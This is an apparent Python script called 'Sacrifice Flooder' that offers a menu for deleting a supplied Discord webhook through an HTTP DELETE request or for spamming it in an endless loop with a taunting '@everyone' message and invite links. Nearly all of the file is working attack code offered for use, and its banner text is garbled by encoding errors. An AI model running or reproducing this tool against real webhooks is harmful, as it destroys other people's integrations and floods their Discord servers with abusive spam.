import os
os.system("title π©ΈSacrifice Flooderπ©Έ β Dev: swayed")
import dhooks
from dhooks import Webhook
import time
import requests, os
import colorama
from colorama import Back, Fore, Style
colorama.init()


os.system("cls")

def menu():
    print(f"""{Fore.MAGENTA}
.ββ Β·  βββΒ·  ββΒ· βββ  βͺ  Β·ββββͺ   ββΒ· βββ .
ββ β. ββ ββ ββ ββͺββ βΒ·ββ βββΒ·ββ ββ ββͺββ.βΒ·
βββββββββββ ββ ββββββ ββΒ·βββͺ ββΒ·ββ ββββββͺβ
ββββͺββββ βͺββββββββββ’ββββββββ.βββββββββββββ
 ββββ  β  β Β·βββ .β  βββββββ βββΒ·βββ  βββ 

> {Fore.CYAN}Created by: swayed (Prob New Tag Or Termed)
{Fore.MAGENTA}> {Fore.RED}https://solo.to/hott (<stay tuned)
""")
    print(f"{Fore.MAGENTA}βββββββββββββββββββββ\nβ[1] Delete Webhook β")
    print(f"{Fore.MAGENTA}β[2] Spam Webhook   β")
    print(f"{Fore.MAGENTA}β[0] Quit           β\nβββββββββββββββββββββ")


menu()
option = int(input(f"{Fore.CYAN}βββ{Fore.RED}[{Fore.MAGENTA}Choose your option{Fore.RED}]{Fore.MAGENTA}{Fore.CYAN}\nββββΊ "))

while option !=0:
    if option ==1:
        #Function For Option 1#
        webhook = input(f"{Fore.CYAN}βββ{Fore.RED}[{Fore.MAGENTA}Enter the webhook you want to delete{Fore.RED}]{Fore.MAGENTA}{Fore.CYAN}\nββββΊ: ")

        def delete():
            requests.delete(webhook)
            check = requests.get(webhook)
            if check.status_code == 404:
                print(f"\n {Fore.BLUE}[LOGS] {Fore.MAGENTA}Webhook {Fore.GREEN}succsesfully deleted")
                os.system("pause >nul")  # (any key to exit the code)
            elif check.status_code == 200:
                print(f"\n {Fore.BLUE}[LOGS] {Fore.RED}FAILED {Fore.MAGENTA}to delete the webhook")
                os.system("pause >nul")

        test = requests.get(webhook)
        if test.status_code == 404:
            print(f"\n {Fore.BLUE}[LOGS] {Fore.MAGENTA}Webhook is {Fore.RED}INVALID")
            os.system("pause >nul")
        elif test.status_code == 200:
            print(f"\n {Fore.BLUE}[LOGS] {Fore.MAGENTA}Webhook is {Fore.GREEN}VALID{Fore.MAGENTA}")
            delete()
    elif option ==2:
        #Function For Option 2#
        username = ("Sacrifice Flooder")
        webhookurl = Webhook(input(f"{Fore.CYAN}βββ{Fore.RED}[{Fore.MAGENTA}Enter webhook{Fore.RED}]{Fore.MAGENTA}{Fore.CYAN}\nββββΊ "))
        message = ("ε**------------------------------Watch Your Webhook Skid:skull:.------------------------------**ε\n||@everyone||hows your webhook?π€‘\n||More Relevant /+ Updates: discord.gg/fys / https://dsc.gg/fys||\nε**---------------------------------------------------------------------------------------------**ε")

        while True:
            time.sleep(0)
            webhookurl.send(message)
            print(f"{Fore.CYAN}ββββΊ{Fore.GREEN}Message Sent.")
            time.sleep(0)
            print(f"{Fore.CYAN}βββ{Fore.RED}[{Fore.MAGENTA}Hit{Fore.RED}]{Fore.MAGENTA}: {Fore.YELLOW}\"ctrl + c\" {Fore.MAGENTA}AT ANY TIME TO STOP!!")
    else:
        print(f"{Fore.RED}Invalid Option")
        
    print()
    menu()
    option = int(input(f"{Fore.CYAN}βββ{Fore.RED}[{Fore.MAGENTA}Choose your option{Fore.RED}]{Fore.MAGENTA}{Fore.CYAN}\nββββΊ "))

print(f"{Fore.MAGENTA}Thx for using Sacrifice, Goodbye!")